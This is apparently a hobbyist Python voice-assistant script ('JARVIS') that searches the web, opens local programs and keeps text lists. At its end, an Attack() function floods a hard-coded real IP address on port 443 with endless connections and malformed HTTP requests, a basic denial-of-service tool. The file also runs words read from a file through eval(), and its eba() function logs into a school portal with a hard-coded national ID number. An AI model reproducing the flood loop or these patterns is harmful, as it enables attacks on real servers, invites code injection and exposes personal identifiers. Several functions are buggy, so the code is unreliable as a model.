import os
import webbrowser as wb
import random
import speech_recognition as sr
import requests
from selenium import webdriver
import selenium
from getpass import getpass
import time
import subprocess
import socket
import threading

aohay = ["Thanks, I am doin' pretty well", "I'm kinda' bored", "Waiting for your commands sir!", "Why do you ask?"]

def AreYouStillThere(sentence):
    with open("keyWords.txt") as f:
        for line in f:
            for word in line.split():
                if word in sentence:
                    eval(word+"()")
                    break
                elif "call me" in sentence:
                    callMe()
            Conversation()


def how():
    import JARVIS
    JARVIS.TalkToMe(random.choice(aohay))
    JARVIS.Assistant(JARVIS.TakeInput())

def Google():
    import JARVIS
    JARVIS.TalkToMe("What should I google?")
    searchG = JARVIS.TakeInput()
    JARVIS.TalkToMe("Results for " + searchG)
    wb.open("https://www.google.com/search?q=" + searchG)
    JARVIS.Assistant(JARVIS.TakeInput())

def YouTube():
    import JARVIS
    JARVIS.TalkToMe("What should I search in YouTube?")
    searchY = JARVIS.TakeInput()
    wb.open("https://www.youtube.com/results?search_query=" + searchY)
    JARVIS.TalkToMe("Here is the results for "+searchY)
    JARVIS.Assistant(JARVIS.TakeInput())


def Reddit():
    import JARVIS
    wb.open("http://reddit.com")
    JARVIS.Assistant(JARVIS.TakeInput())

def Conversation():
    import JARVIS
    JARVIS.TalkToMe("Wow! Can I learn that?")
    answr = JARVIS.TakeInput()
    if "yes" in answr or "sure" in answr:
        JARVIS.TalkToMe("Well is this a local thing or online thing?")
        answer = JARVIS.TakeInput()
        if "local" in answer:
            JARVIS.TalkToMe("So then please select a key word so I can remember the command!")
            keyL = input("key:")
            JARVIS.TalkToMe("And now please write the path of the program")
            pathL = input("path:")
            JARVIS.LearnLocal(pathL, keyL)
            JARVIS.TalkToMe("Just say "+keyL+" and I will open your program.")
            JARVIS.Assistant(JARVIS.TakeInput())
        elif "online" in answer:
            JARVIS.TalkToMe("Well well choose a key word for command.")
            keyO = input("key:")
            JARVIS.TalkToMe("And now please write me the web adress.")
            pathO = input("web adress:")
            JARVIS.LearnOnline(pathO, keyO)
            JARVIS.TalkToMe("From now on if you say "+keyO+" I will open this"+ pathO + " web adress.")
            JARVIS.Assistant(JARVIS.TakeInput())
        else:
            JARVIS.TalkToMe("I asked online or offline what do you mean with "+answer+"?")
            JARVIS.Assistant(JARVIS.TakeInput())

    elif "no" in answr or "nope" in answr:
        JARVIS.TalkToMe("Maybe another time :(")
        JARVIS.Assistant(JARVIS.TakeInput())
    else:
        JARVIS.TalkToMe(answr+"? I think you mean no.")
        JARVIS.Assistant(JARVIS.TakeInput())



def NewList():
    import JARVIS as j
    j.TalkToMe("Do you wanna create a new list?")
    answer = j.TakeInput()
    if "yes" in answer or "yeah" in answer:
        j.TalkToMe("Alright then, please give a name to your list.")
        lName = input("name:")
        lName += ".txt"
        try: 
            f = open(lName, "x")
        except FileExistsError:
            j.TalkToMe(lName+" already exists. Do you wanna add objects to it?")
            answr = j.TakeInput()
            if "yes" in answr:
                AddObjectToList(lName)
            else:
                j.Assistant(j.TakeInput())

        else:
            t = open("listNames.txt", "a")
            t.write(" "+lName)
            t.close()
            j.TalkToMe("Okay so write me the things that you want in "+lName+". If you are done write me \"done\".")
            while True:
                a = input("-->")
                if "done" not in a:
                    f.write(a+" ")
                else:
                    f.close()
                    j.TalkToMe("I have saved your list. If you want me to read your list use \"ReadList\" command.")
                    j.Assistant(j.TakeInput())
                    break
    elif "no" in answer or "nope" in answer:
        j.TalkToMe("I guess I will die then!")
        j.Assistant(j.TakeInput())
    else:
        j.TalkToMe("You are such a dumb dumb.")
        j.Assistant(j.TakeInput())

def AddObjectToList(fName):
    import JARVIS as j
    j.TalkToMe("I will!")
    j.Assistant(j.TakeInput())

def ReadList():
    import JARVIS as j
    j.TalkToMe("Here is your lists:")
    j.TalkToMe("Write me the name of the list that you want me to read.")
    with open("listNames.txt") as m:
        for line in m:
            for word in line.split(".txt"):
                j.TalkToMe(word)
    answr = input("list name:")
    if ".txt" in answr:
        with open(answr) as f:
            for line in f:
                for word in line.split(".txt"):
                    print("-"+word)
    elif ".txt" not in answr:
        with open(answr+".txt") as f:
            for line in f:
                for word in line.split():
                    j.TalkToMe("-"+word)
            f.close()
            j.Assistant(j.TakeInput())
    else:
        j.TalkToMe("I couldn't find a list named "+answr)
        j.Assistant(j.TakeInput())

def eba():
    import JARVIS as j
    driver = webdriver.Edge("C:\\Users\\user65\\Desktop\\Dev\\edge_driver\\msedgedriver.exe")
    driver.get("https://giris.eba.gov.tr/EBA_GIRIS/student.jsp")

    tcNo_textbox = driver.find_element_by_id("tckn")
    tcNo_textbox.send_keys("10436757744")

    password_textbox = driver.find_element_by_id("password")
    password_textbox.send_keys("*****")

    login_button = driver.find_element_by_class_name("nl-form-send-btn")
    login_button.submit()

    driver.get("https://ders.eba.gov.tr/ders/proxy/VCollabPlayer_v0.0.686/liveMiddleware/eba.html")
    driver.set_page_load_timeout(30)
    try: 
        join_button = driver.find_element_by_id("6df20c71-eb71-80a4-74e2-b63a1a491206")
        join_button.submit()
    except selenium.common.exceptions.NoSuchElementException:
        print("yoh")
        j.Assistant(j.TakeInput())
    else:
        print("bastım")
        j.Assistant(j.TakeInput())
                                                                                                                                                     
def vBox():                                                                                                                                                 
    import JARVIS                                                                                                                                                 
    subprocess.Popen("C:\\Program Files\\Oracle\\VirtualBox\\VirtualBox.exe")                                                                                                                                                
    JARVIS.Assistant(JARVIS.TakeInput())                                                                                                                                                 
                                                                                                                                                             
def blender():                                                                                                                                                 
    import JARVIS                                                                                                                                                 
    subprocess.Popen("C:\\Program Files\\Blender Foundation\\Blender 2.83\\blender.exe")                                                                                                                                                
    JARVIS.Assistant(JARVIS.TakeInput())                                                                                                                                                 

def callMe():
    import JARVIS as j
    j.TalkToMe("How do you want me to call you")
    answr = j.TakeInput()
    f = open("callMe.txt")
    f.write(answr)
    f.close                                                                                                                                                 
def skype():                                                                                                                                                 
    import JARVIS                                                                                                                                                 
    subprocess.Popen("C:\\Program Files (x86)\\Microsoft\\Skype for Desktop\\Skype.exe")                                                                                                                                                
    JARVIS.Assistant(JARVIS.TakeInput())                                                                                                                                                 


def Attack():
    already_connected = 0
    target="104.18.38.242"
    port = 443
    fake_ip = "0.0.0.0"
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1,1\r\n").encode("ascii"), (target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target,port))
        s.close()

        already_connected += 1
        if already_connected % 10 == 0:
            print(already_connected)
